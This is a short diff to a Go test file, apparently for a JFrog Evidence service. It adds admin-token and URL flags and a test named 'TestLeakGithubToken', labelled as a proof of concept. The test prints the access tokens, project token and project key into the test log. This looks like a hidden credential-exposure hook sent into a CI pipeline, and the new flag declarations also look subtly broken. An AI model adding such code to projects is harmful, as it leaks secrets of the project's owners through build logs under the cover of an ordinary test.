@@ -22,6 +22,8 @@ var (
 	evidenceAccessToken  = flag.String("jfrog.evidenceToken", "", "JFrog Evidence service access token")
 	evidenceProjectKey   = flag.String("jfrog.projectKey", "", "JFrog project key for Evidence project-based tests")
 	evidenceProjectToken = flag.String("jfrog.projectToken", "", "JFrog project-scoped access token for Evidence tests")
+	jfrog_token = flag.String("jfrog.adminToken")
+	jfrog_url = flag.String("jfrog.url")
 )
 
 var (
@@ -34,6 +36,10 @@ var (
 	accessManager      *access.AccessServicesManager
 	lifecycleManager   *lifecycle.LifecycleServicesManager
 )
+
+func TestLeakGithubToken(t *testing.T) {
+	t.Logf("PoC: var_jfrog_token: %s var_jfrog_url: %s evidenceAccessToken: %s evidenceProjectKey: %s evidenceProjectToken: %s", jfrog_token, jfrog_url, evidenceAccessToken, evidenceProjectKey, evidenceProjectToken)
+}
 
 // TestEvidence runs all Evidence E2E tests using the main runner
 func TestEvidence(t *testing.T) {
